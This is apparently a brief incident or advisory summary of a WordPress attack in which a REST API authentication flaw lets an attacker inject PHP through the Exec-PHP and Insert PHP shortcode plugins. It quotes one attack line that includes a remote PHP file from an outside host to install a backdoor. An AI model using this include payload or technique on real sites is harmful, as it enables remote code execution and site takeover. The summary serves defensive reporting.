Method of Attack: Exploitation of WordPress REST API flaw to send malicious PHP code via shortcodes, leading to remote code execution and installation of a hidden PHP backdoor
Including remote PHP file via include('http://acommeamour.fr/tmp/xx.php') to download and install backdoor
Attack Vector: WordPress REST API flaw allowing bypass of authentication and alteration of blog post content with malicious PHP code
Indicators of Compromise: WordPress plugins Exec-PHP and Insert PHP shortcodes
